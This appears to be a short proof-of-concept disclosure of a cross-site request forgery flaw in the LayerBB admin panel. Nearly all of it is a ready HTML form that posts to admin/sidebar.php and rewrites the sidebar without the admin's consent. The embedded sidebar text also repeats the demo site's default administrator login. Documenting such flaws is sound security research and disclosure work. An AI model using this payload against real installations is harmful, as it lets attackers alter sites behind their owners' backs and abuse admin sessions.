# Sidebar CSRF
Allows the sidebar to be edited through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form method="POST" action="http://localhost/admin/sidebar.php" style="padding: 25px;">
    <input type="hidden" name="id" value="1">
    <div class="form-group">
      <label for="title">Title</label>
      <input type="text" class="form-control" id="title" name="title" value="Demo Information">
    </div>
    <div class="form-group">
      <label for="content">Content</label>
      <textarea class="form-control" name="content" id="content" style="min-height:250px;">&lt;div class="alert alert-danger" role="alert"&gt; This is the LayerBB Demo Website, you can login using&lt;br /&gt;&lt;br /&gt; User: Administrator &lt;br /&gt;Pass: admin (Case sensitive)&lt;br /&gt;&lt;br /&gt;This demo gets refreshed every 24-hours.&lt;/div&gt;</textarea>
    </div>
    <div class="form-group">
      <label for="style">Style</label>
      <select class="form-control" id="style" name="style">
      <option value="danger">Current - Do Not Change</option>
      <option value="primary">Primary</option>
      <option value="success">Success</option>
      <option value="info">Info</option>
      <option value="warning">Warning</option>
      <option value="danger">Danger</option></select>
    </div>
    <div class="form-group">
      <label for="glyphicon">Glyphicon (Optional)</label>
      <input type="text" class="form-control" id="glyphicon" name="glyphicon" value="alert">
    </div>
    <div class="form-group">
      <label for="order">Order</label>
      <input type="text" class="form-control" id="order" name="order" value="1">
    </div>
  <button type="submit" name="savechange" id="savechange" class="btn btn-primary">Save Changes</button>
</form>
```
